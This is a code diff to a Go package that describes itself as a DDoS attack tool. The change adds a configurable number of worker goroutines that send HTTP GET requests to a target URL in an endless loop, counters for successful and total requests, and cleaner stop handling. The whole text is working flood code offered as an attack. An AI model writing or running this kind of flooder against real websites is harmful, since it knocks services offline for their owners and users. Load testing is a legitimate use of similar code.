@@ -5,47 +5,66 @@ import (
 	"io/ioutil"
 	"net/http"
 	"runtime"
+	"sync/atomic"
 )
 
 // DDoS - structure of value for DDoS attack
 type DDoS struct {
 	url           string
-	stop          chan bool
+	stop          *chan bool
 	amountWorkers int
+
+	// Statistic
+	successRequest int64
+	amountRequests int64
 }
 
 // NewDDoS - initialization of new DDoS attack
-func NewDDoS(url string) *DDoS {
+func NewDDoS(url string, workers int) *DDoS {
+	s := make(chan bool)
+	if workers < 1 {
+		workers = 1
+	}
 	return &DDoS{
-		url: url,
+		url:           url,
+		stop:          &s,
+		amountWorkers: workers,
 	}
 }
 
 // Run - run DDoS attack
-func (d DDoS) Run() {
-	d.amountWorkers = runtime.GOMAXPROCS(-1)
+func (d *DDoS) Run() {
 	for i := 0; i < d.amountWorkers; i++ {
 		go func() {
 			for {
 				select {
-				case <-d.stop:
+				case <-(*d.stop):
 					return
 				default:
 					// sent http GET requests
-					resp, _ := http.Get(d.url)
-					if resp != nil {
+					resp, err := http.Get(d.url)
+					atomic.AddInt64(&d.amountRequests, 1)
+					if err == nil {
+						atomic.AddInt64(&d.successRequest, 1)
 						_, _ = io.Copy(ioutil.Discard, resp.Body)
 						_ = resp.Body.Close()
 					}
 				}
+				runtime.Gosched()
 			}
 		}()
 	}
 }
 
 // Stop - stop DDoS attack
-func (d DDoS) Stop() {
+func (d *DDoS) Stop() {
 	for i := 0; i < d.amountWorkers; i++ {
-		d.stop <- true
+		(*d.stop) <- true
 	}
+	close(*d.stop)
+}
+
+// Result - result of DDoS attack
+func (d DDoS) Result() (successRequest, amountRequests int64) {
+	return d.successRequest, d.amountRequests
 }
